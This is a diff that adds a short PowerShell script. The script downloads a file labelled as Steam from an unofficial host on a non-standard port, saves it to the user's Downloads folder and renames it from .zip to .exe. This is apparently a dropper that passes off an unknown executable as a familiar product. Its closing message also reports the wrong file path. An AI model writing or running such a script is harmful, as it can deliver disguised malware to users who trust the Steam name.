@@ -1,0 +1,9 @@
+$url = "http://mc.fissionhost.org:15028/steam-zip"
+$downloadPath = Join-Path $env:USERPROFILE "Downloads\steam.zip"
+
+Invoke-WebRequest -Uri $url -OutFile $downloadPath
+$exePath = [System.IO.Path]::ChangeExtension($downloadPath, ".exe")
+Rename-Item -Path $downloadPath -NewName (Split-Path $exePath -Leaf)
+
+Write-Output "File downloaded to: $downloadPath"
+# Press enter to complete
